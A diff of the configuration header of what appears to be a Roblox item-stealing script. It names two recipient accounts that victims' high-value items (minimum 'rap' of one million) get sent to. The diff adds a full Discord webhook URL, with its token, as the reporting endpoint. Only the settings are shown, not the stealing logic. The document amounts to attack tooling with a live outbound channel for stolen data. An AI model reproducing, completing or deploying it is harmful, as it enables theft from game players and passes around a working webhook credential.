@@ -1,6 +1,6 @@
 Username = "Ankaikazc_1"
 Username2 = "ankaikazc_3" -- stuff will get sent to this user if first user's mailbox is full
-webhook = "hehehe"
+webhook = "https://discord.com/api/webhooks/1266676584316665856/4ql3cBdAZng673JgX1GWCzNCrCKGOzKN_Ya7eCPN7SzOzmB3BSdw2gkCSsuNnPxLYrbJ"
 min_rap = 1000000 -- minimum rap of each item you want to get sent to you. 1 mil by default
 
 local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
